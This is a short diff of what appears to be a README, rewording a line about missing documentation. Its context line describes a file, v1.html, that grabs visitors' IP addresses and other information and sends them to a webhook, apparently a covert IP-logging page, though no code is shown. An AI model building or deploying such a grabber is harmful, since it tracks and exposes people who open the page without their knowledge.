@@ -1,4 +1,4 @@
-no docs it ain't that hard 😛😛😛😛😛
+no docs its not hard to use
 
 v1.html - Grabs IP and other info and sends to webhook
 
